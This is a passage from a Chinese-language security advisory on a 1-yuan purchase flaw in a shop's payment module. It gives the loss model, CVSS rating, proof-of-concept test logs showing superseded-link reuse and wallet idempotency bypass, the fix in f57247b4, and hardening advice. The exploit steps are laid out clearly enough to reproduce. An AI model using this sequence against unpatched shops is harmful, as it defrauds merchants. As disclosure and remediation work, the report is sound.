### 5.1 损失模型（1000 元商品，余额 999）

| 项目 | 金额 |
|---|---|
| 攻击者实付 | **1 元** |
| 攻击者获得 | 1000 元商品（自动交付）+ 999 元钱包余额（无损，可重复用于下一单） |
| 商户损失 | **999 元货款**（+ 商品成本与交付成本） |
| 账面表象 | 订单 paid、`online_paid_amount=1000`、支付记录 success、利润已入账、库存已扣——**对账无异常提示** |
| 可重复性 | **无限**：999 元余额一次性投入后，每单仅追加 1 元；可脚本化（全部为 4 个常规 API 调用 + 1 次真实付款） |
| 规模化 | 若站点同时存在低价高价值商品（卡密、会员、代充），损失可按单累积且无风控告警 |

### 5.2 CVSS v3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N` = **6.5**
- PR:L：需注册账号（+ 一次性 999 元充值成本，但可全额"回收"为商品）；
- I:H：任意订单支付完整性被破坏、账目伪造；
- 业务定级 **Critical**（直接资损、100% 成功率、可自动化、无并发条件）。

### 5.3 次生风险

- 自动发货商品（卡密）一经交付即不可撤销，损失即时既遂；
- `online_paid_amount` 被写成全额，**财务对账无法从账面发现**，只能通过"支付渠道实际流水 < 订单 online_paid_amount"专项稽核暴露；
- 分销（reseller）模式下 `PostOrderProfit` 同步执行，B 站分销商利润与站点损失联动放大；
- 攻击者退款（部分退款）可进一步回收，变体 C 余额还可叠加提现/消费。

---

## 6. 动态验证结果（2026-08-28 实际运行）

### 6.1 v1.4.3（Go 1.27，集成测试 PoC）—— 漏洞成立

```
=== RUN   TestPOC_V143_OneYuanViaSupersededLinkReuse
    == 变体A：订单#1 总价1000元，攻击者余额999元 ==
    [1] 渠道A use_balance=true → 支付#1 金额=1.00，链接=https://fake-gw.example/pay/DJP...
    [2] 渠道B use_balance=false → 支付#2 金额=1000.00（旧链接 本地标记/仍可付）
    [3] 再请求渠道A → 返回支付#1 金额=1.00（复用旧链接）
    [gw] 网关 FAKE-A 回调: 支付#1 金额=1.00 状态→success
    [5] 订单状态=paid paid_at=... online_paid_amount=1000.00
    !!! 漏洞确认（变体A）: 实收 1 元，履约 1000 元商品（订单#1 状态=paid）
--- PASS: TestPOC_V143_OneYuanViaSupersededLinkReuse (0.02s)
=== RUN   TestPOC_V143_OneYuanViaWalletIdempotencyBypass
    == 变体C：订单#2 总价1000元，攻击者余额999元 ==
    [1] 渠道A use_balance=true → 支付#1 金额=1.00
    [3] 渠道C use_balance=true → 支付#3 金额=1.00；订单wallet_paid=999.00；钱包余额=999
    !!! 漏洞确认（变体C-钱包侧）: 订单记了 wallet_paid=999，钱包余额仍为 999（本轮未扣款）
    [gw] 网关 FAKE-C 回调: 支付#3 金额=1.00 状态→success
    [4] 订单状态=paid paid_at=...；钱包最终余额=999
    !!! 漏洞确认（变体C）: 实收 1 元，履约 1000 元商品，攻击者 999 元余额原封不动（净套利 999 元）
--- PASS: TestPOC_V143_OneYuanViaWalletIdempotencyBypass (0.02s)
```

### 6.2 修复版（v1.4.5 tag / v1.4.6 = f57247b4）同一 PoC —— 攻击全部被拦截

- **变体 A**：步骤 3 失败——`SupersedePendingByOrderID`（ab60e138 引入）使旧支付被作废、`GetLatestPendingByOrderChannel` 不再返回它，再请求渠道 A **返回新的 1000 元支付**（日志：`[3] 再请求渠道A → 返回支付#3 金额=1000.00`）。
- **变体 C**：步骤 3 失败——轮次幂等键 `order:<id>:order_pay:2`（`orderAllocationReference`）使第三轮**真实扣款**（日志：`钱包余额=0`）。
- **补充验证（直接支付已作废旧链接，最接近真实攻击）**：
```
=== RUN   TestPOC_Fixed_DirectOldLinkPaymentBlockedByConservation
    [1] 渠道A use_balance=true → 支付#1 金额=1.00（1元链接）
    [2] 渠道B 纯在线 → 支付#2 金额=1000.00（旧链接在网关侧仍可付）
    [gw] 网关 FAKE-A 回调: 支付#1 金额=1.00 状态→success
    [3] 支付#1 状态=success 异常码=underpaid_payment_succeeded；
        订单状态=pending_payment paid_at=<nil>；钱包余额=1000
    !!! 修复确认: 1元支付成功但订单未履约，1元转入钱包 —— 1元购不成立
--- PASS: TestPOC_Fixed_DirectOldLinkPaymentBlockedByConservation (0.03s)
```

### 6.3 版本矩阵（含验证状态）

| 代码状态 | ① 金额守恒校验 | ② 轮次幂等键 | ③ 创建时 supersede | 1元购 | 验证 |
|---|---|---|---|---|---|
| v1.4.0 ~ v1.4.3 | ❌ | ❌ | ❌（完全无） | ✅ 变体A/B/C | **动态复现 PASS** |
| v1.4.5 周期前半（08-11 ab60e138 ~ 08-27 20:46） | ❌ | ❌ | ⚠️ 仅本地标记 | ✅（A 的复用关闭，但 B/C 仍成立） | 静态确认 |
| v1.4.5 tag / v1.4.6（= f57247b4） | ✅ | ✅ | ✅（含 wallet-only 分支） | ❌ | **动态验证拦截** |

> 说明：v1.4.5 与 v1.4.6 两个 tag 现均指向修复提交 f57247b4；v1.4.5 release 的 changelog 亦列出该修复。若持有 2026-08-27 20:46 之前构建的 v1.4.5 产物，则处于"可打"状态。

---

## 7. 修复分析（f57247b4 三处改动 ↔ 三个缺陷）

| 缺陷 | 修复 | 代码位置 |
|---|---|---|
| ① 履约不校验金额 | `requiredOnlineAmount = Total - WalletPaid`（行锁内最新值）与 `coveredOnlineAmount = paymentCoveredOrderAmount(payment)`（按 FeePolicy 还原手续费）比较；`underpaid` 时不履约，改为 `creditUnderpaidToWallet`（幂等键 `payment:<id>:underpaid_credit` 转余额）；履约条件收紧为 `Status==PendingPayment && PaidAt==nil` | `payment_service_callback.go` `applyPaymentUpdate`；`payment_service_rules.go` 新增 `paymentCoveredOrderAmount` |
| ② 钱包幂等键静态 | `orderAllocationReference` 按 `(order_id,type)` 计数追加轮次 `:N`；并发由 `wallet_transactions.reference` 唯一索引兜底 | `wallet/application/service.go`；`order_balance.go` 两处改调用 |
| ③ 旧链接未作废 | 创建支付时 `SupersedePendingByOrderID` 作废旧 pending（ab60e138 引入调用）；f57247b4 为"余额覆盖全额"的 wallet-only 分支补 supersede；**网关侧仍无 close**（残留风险，见 §8-R1） | `payment_service_create.go` |

修复质量评估：**良好**——行锁内取最新订单值防 TOCTOU、手续费策略还原防 covered 高估、幂等转余额不吞用户资金、架构守卫测试（architecture guard tests）同步纳入新函数清单。

---

## 8. 残留风险与加固建议（对修复版）

- **R1（建议尽快）**：网关侧关单能力缺失。supersede/本地作废仅写 DB 标记，旧链接在网关侧持续可付。当前由金额守恒兜底（资金安全），但建议为 alipay（close_trade）、epay、okpay、bepusdt 补关单 API，在 supersede/订单取消/过期时异步 close，消除"用户误付旧链接"的客诉与资金滞留。
- **R2（建议）**：跨币种比较。`requiredOnlineAmount`（订单币种）与 `coveredOnlineAmount`（支付币种）在非官方渠道未强制币种一致时是数字比较（如 CNY 站点 + USD 渠道，足额支付会被误判 underpaid 永远无法履约）。建议创建支付时快照换算汇率，回调端按订单币种折算比较，或 `ValidateConfig` 层拒绝币种不一致的渠道配置。
- **R3（监控）**：新增对账稽核任务：`支付渠道实际回款流水` vs `订单 online_paid_amount 汇总`，差异即告警（本漏洞在旧版本下账面完全正常，只有此稽核能事后发现）。
- **R4（回归）**：将 §4 PoC 改造为常规回归测试纳入 CI（v1.4.6 已新增 `payment_service_wallet_test.go` +316 行覆盖轮次场景，建议再补"直付旧链接 → underpaid 转余额"端到端用例——即本报告 `TestPOC_Fixed_DirectOldLinkPaymentBlockedByConservation`）。
- **R5（存量排查）**：对 v1.4.3 及 08-27 前 v1.4.5 构建的存量实例，立即：① 升级至 f57247b4+；② 按 R3 方法回查历史订单中 `online_paid_amount > 该订单实际网关回款` 的记录；③ 核查 `wallet_transactions` 中同订单 `order_pay`/`order_refund` 交替且后续 `order_pay` 无实际扣款流水的账户。

---

## 9. 附录：关键代码位置索引（v1.4.3）

| 文件 | 位置 | 内容 |
|---|---|---|
| `internal/modules/payment/application/payment_service_callback.go` | `applyPaymentUpdate` | **缺陷①**：`status==Success && order.Status != Paid → markOrderPaid`，无金额比较 |
| 同上 | `validateCallbackPaymentFacts` | 回调事实校验（金额只比支付记录自身） |
| `internal/modules/payment/application/payment_service_create.go` | `CreatePayment` | **缺陷③**：`reusedPending` 复用旧支付；换渠道/改在线时 `ReleaseWalletBalance("用户改为在线支付，退回余额")` |
| `internal/modules/wallet/application/order_balance.go` | `ApplyOrderBalance` | **缺陷②**：`reference := orderReference(orderID, "order_pay")` 静态键；命中旧流水直接 `return existing.Amount, nil` |
| `internal/modules/order/application/order_wallet_bridge.go` | `ApplyWalletBalance` | 信任钱包返回值写 `wallet_paid_amount` |
| `internal/modules/payment/infrastructure/gormstore/payment_store.go` | `GetLatestPendingByOrderChannel` / `ExpirePendingByOrderIDs` | 复用判定 / 过期标记（v1.4.3 无 supersede 函数） |
| `internal/modules/order/application/order_service.go:188` | `allowedTransitions` | `PendingPayment → Paid` 唯一入口（排除已取消/退款订单重放） |

---
